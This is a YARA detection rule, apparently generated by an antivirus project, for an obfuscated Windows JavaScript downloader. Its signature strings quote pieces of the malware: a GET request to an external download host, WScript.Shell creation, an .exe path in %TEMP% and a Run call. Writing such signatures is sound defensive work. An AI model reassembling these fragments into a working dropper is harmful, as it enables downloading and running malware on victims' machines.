rule sig_20160401_8c940c01eb7a5323886d662cd1cc5e25 {
  meta:
    description = "datamaliciousorder - file 20160401_8c940c01eb7a5323886d662cd1cc5e25.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff67bd9703d7caa0d2c8e9b9a3b4460bc9df8cb1df866781f9e7d1bce37feb4a"

  strings:
    $s1  = "XqhBa[CwfHd](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function AauEt(NpDq, OkmMss){XtGxb = XtGxb * 1; return NpDq - OkmMss;};" fullword ascii
    $s3  = "var JwrYgx = function SqEws() {return WScript[YbZte](\"WScript\"+\".Shell\");}(), LjBzz = 11;" fullword ascii
    $s4  = "if (XqhBa[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YnxPil(){return WlDur + \"\";};" fullword ascii
    $s6  = "function NlIr() {return JwrYgx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gxgoB2kGoXdIiVM.ex\" + \"e\";};" fullword ascii
    $s7  = "function DrNpc() {return ((YxgQmw == true) && (YxgQmw == RwNv)) ? 1 : XtGxb;};" fullword ascii
    $s8  = "var IkNrk = false;" fullword ascii
    $s9  = "function QbgUi(){return YbZte;};" fullword ascii
    $s10 = "RwNv = true; " fullword ascii
    $s11 = "function WvYld(MlsEjr) {var GohHck = (1, 2, 3, 4, 5, MlsEjr); return GohHck;};" fullword ascii
    $s12 = "var RwNv = false;" fullword ascii
    $s13 = "function EwJt(WsoYv){JwrYgx[\"R\"+\"un\"](WsoYv, XtGxb, XtGxb);};" fullword ascii
    $s14 = "var DayPha = new this[\"Date\"]();" fullword ascii
    $s15 = "}while (XugTi);" fullword ascii
    $s16 = "var YxgQmw = false;" fullword ascii
    $s17 = "return AauEt(PydKd, ZxmTxd);" fullword ascii
    $s18 = "YxgQmw = true; " fullword ascii
    $s19 = "function EkDzh()" fullword ascii
    $s20 = "function AqkXml(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}